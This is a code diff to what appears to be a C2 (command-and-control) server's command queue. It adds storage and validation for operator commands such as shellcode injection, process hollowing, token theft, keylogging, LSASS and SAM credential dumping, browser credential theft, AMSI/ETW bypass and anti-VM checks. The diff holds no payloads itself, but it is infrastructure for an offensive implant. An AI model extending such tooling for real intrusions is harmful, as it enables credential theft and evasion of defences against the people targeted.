@@ -248,6 +248,46 @@ func (cq *CommandQueue) CancelCommand(commandID string) error {
 
 // ── conversion helpers ────────────────────────────────────────────────────────
 
+// cmdPayload holds all Phase 2+ fields that don't have dedicated DB columns.
+// It is stored as JSON in the payload_json column so nothing is lost on round-trip.
+type cmdPayload struct {
+	// Phase 2
+	ShellcodeB64    string `json:"shellcode_b64,omitempty"`
+	InjectMethod    string `json:"inject_method,omitempty"`
+	InjectPID       uint32 `json:"inject_pid,omitempty"`
+	SpoofParentPID  uint32 `json:"spoof_parent_pid,omitempty"`
+	SpoofParentName string `json:"spoof_parent_name,omitempty"`
+	TimestompRef    string `json:"timestomp_ref,omitempty"`
+	TimestompTime   string `json:"timestomp_time,omitempty"`
+	FetchURL        string `json:"fetch_url,omitempty"`
+	FetchMethod     string `json:"fetch_method,omitempty"`
+	// Phase 3
+	BypassTargetPID uint32 `json:"bypass_target_pid,omitempty"`
+	TokenPID        uint32 `json:"token_pid,omitempty"`
+	TokenUser       string `json:"token_user,omitempty"`
+	TokenDomain     string `json:"token_domain,omitempty"`
+	TokenPass       string `json:"token_pass,omitempty"`
+	TokenExe        string `json:"token_exe,omitempty"`
+	TokenArgs       string `json:"token_args,omitempty"`
+	KeylogDuration  int    `json:"keylog_duration,omitempty"`
+	// Phase 4
+	SacrificialDLL string `json:"sacrificial_dll,omitempty"`
+	// Phase 5
+	BrowserType string `json:"browser_type,omitempty"`
+	// Phase 6
+	SleepDuration int `json:"sleep_duration,omitempty"`
+	// Phase 8
+	HWBPAddr     string `json:"hwbp_addr,omitempty"`
+	HWBPRegister uint8  `json:"hwbp_register,omitempty"`
+	// Phase 9
+	BOFData string `json:"bof_data,omitempty"`
+	BOFArgs string `json:"bof_args,omitempty"`
+	// Phase 10
+	WorkingHoursStart int    `json:"working_hours_start,omitempty"`
+	WorkingHoursEnd   int    `json:"working_hours_end,omitempty"`
+	KillDate          string `json:"kill_date,omitempty"`
+}
+
 func cmdToRow(cmd *types.Command) (storage.CommandRow, error) {
 	argsJSON, err := json.Marshal(cmd.Args)
 	if err != nil {
@@ -268,6 +308,40 @@ func cmdToRow(cmd *types.Command) (storage.CommandRow, error) {
 	}
 	if !cmd.CompletedAt.IsZero() {
 		compAt = cmd.CompletedAt.Unix()
+	}
+
+	payload := cmdPayload{
+		ShellcodeB64:      cmd.ShellcodeB64,
+		InjectMethod:      cmd.InjectMethod,
+		InjectPID:         cmd.InjectPID,
+		SpoofParentPID:    cmd.SpoofParentPID,
+		SpoofParentName:   cmd.SpoofParentName,
+		TimestompRef:      cmd.TimestompRef,
+		TimestompTime:     cmd.TimestompTime,
+		FetchURL:          cmd.FetchURL,
+		FetchMethod:       cmd.FetchMethod,
+		BypassTargetPID:   cmd.BypassTargetPID,
+		TokenPID:          cmd.TokenPID,
+		TokenUser:         cmd.TokenUser,
+		TokenDomain:       cmd.TokenDomain,
+		TokenPass:         cmd.TokenPass,
+		TokenExe:          cmd.TokenExe,
+		TokenArgs:         cmd.TokenArgs,
+		KeylogDuration:    cmd.KeylogDuration,
+		SacrificialDLL:    cmd.SacrificialDLL,
+		BrowserType:       cmd.BrowserType,
+		SleepDuration:     cmd.SleepDuration,
+		HWBPAddr:          cmd.HWBPAddr,
+		HWBPRegister:      cmd.HWBPRegister,
+		BOFData:           cmd.BOFData,
+		BOFArgs:           cmd.BOFArgs,
+		WorkingHoursStart: cmd.WorkingHoursStart,
+		WorkingHoursEnd:   cmd.WorkingHoursEnd,
+		KillDate:          cmd.KillDate,
+	}
+	payloadBytes, err := json.Marshal(payload)
+	if err != nil {
+		return storage.CommandRow{}, err
 	}
 
 	return storage.CommandRow{
@@ -296,6 +370,7 @@ func cmdToRow(cmd *types.Command) (storage.CommandRow, error) {
 		CreatedAt:       cmd.CreatedAt.Unix(),
 		ExecutedAt:      execAt,
 		CompletedAt:     compAt,
+		PayloadJSON:     string(payloadBytes),
 	}, nil
 }
 
@@ -332,14 +407,48 @@ func rowToCmd(r storage.CommandRow) *types.Command {
 	_ = json.Unmarshal([]byte(r.ArgsJSON), &cmd.Args)
 	_ = json.Unmarshal([]byte(r.MetadataJSON), &cmd.Metadata)
 	_ = json.Unmarshal([]byte(r.ProcessArgsJSON), &cmd.ProcessArgs)
+
+	if r.PayloadJSON != "" && r.PayloadJSON != "{}" {
+		var p cmdPayload
+		if err := json.Unmarshal([]byte(r.PayloadJSON), &p); err == nil {
+			cmd.ShellcodeB64 = p.ShellcodeB64
+			cmd.InjectMethod = p.InjectMethod
+			cmd.InjectPID = p.InjectPID
+			cmd.SpoofParentPID = p.SpoofParentPID
+			cmd.SpoofParentName = p.SpoofParentName
+			cmd.TimestompRef = p.TimestompRef
+			cmd.TimestompTime = p.TimestompTime
+			cmd.FetchURL = p.FetchURL
+			cmd.FetchMethod = p.FetchMethod
+			cmd.BypassTargetPID = p.BypassTargetPID
+			cmd.TokenPID = p.TokenPID
+			cmd.TokenUser = p.TokenUser
+			cmd.TokenDomain = p.TokenDomain
+			cmd.TokenPass = p.TokenPass
+			cmd.TokenExe = p.TokenExe
+			cmd.TokenArgs = p.TokenArgs
+			cmd.KeylogDuration = p.KeylogDuration
+			cmd.SacrificialDLL = p.SacrificialDLL
+			cmd.BrowserType = p.BrowserType
+			cmd.SleepDuration = p.SleepDuration
+			cmd.HWBPAddr = p.HWBPAddr
+			cmd.HWBPRegister = p.HWBPRegister
+			cmd.BOFData = p.BOFData
+			cmd.BOFArgs = p.BOFArgs
+			cmd.WorkingHoursStart = p.WorkingHoursStart
+			cmd.WorkingHoursEnd = p.WorkingHoursEnd
+			cmd.KillDate = p.KillDate
+		}
+	}
 	return cmd
 }
 
 // ── validation (unchanged) ────────────────────────────────────────────────────
 
 func validateCommandForQueue(cmd *types.Command) error {
-	if cmd.Command == "" {
-		return fmt.Errorf("command text cannot be empty")
+	// execute / basic shell commands require a non-empty command text
+	if (cmd.OperationType == "" || cmd.OperationType == "execute") && cmd.Command == "" {
+		return fmt.Errorf("command text cannot be empty for execute operations")
 	}
 	if len(cmd.Command) > 10000 {
 		return fmt.Errorf("command too long (max 10000 characters)")
@@ -351,9 +460,29 @@ func validateCommandForQueue(cmd *types.Command) error {
 		return fmt.Errorf("agent ID cannot be empty")
 	}
 	validOps := map[string]bool{
+		// core
 		"": true, "execute": true, "upload": true, "download": true,
 		"process_list": true, "process_kill": true, "process_start": true,
 		"persist_setup": true, "persist_remove": true,
+		// phase 2 — injection / lolbins
+		"inject_remote": true, "inject_self": true,
+		"timestomp": true, "lolbin_fetch": true, "ads_exec": true,
+		// phase 3 — bypass / token / recon
+		"amsi_bypass": true, "etw_bypass": true,
+		"token_list": true, "token_steal": true, "token_impersonate": true,
+		"token_make": true, "token_revert": true, "token_runas": true,
+		"screenshot": true,
+		"keylog_start": true, "keylog_dump": true, "keylog_stop": true, "keylog_clear": true,
+		// phase 4 — advanced injection
+		"hollow": true, "hijack": true, "stomp": true, "mapinject": true,
+		// phase 5 — credential access
+		"lsass_dump": true, "sam_dump": true, "browsercreds": true, "clipboard_read": true,
+		// phase 6-8 — evasion
+		"sleep_obf": true, "unhook_ntdll": true, "hwbp_set": true, "hwbp_clear": true,
+		// phase 9 — BOF
+		"bof_exec": true,
+		// phase 10 — OPSEC
+		"antidebug": true, "antivm": true, "timegate_set": true,
 	}
 	if !validOps[cmd.OperationType] {
 		return fmt.Errorf("invalid operation type: %s", cmd.OperationType)
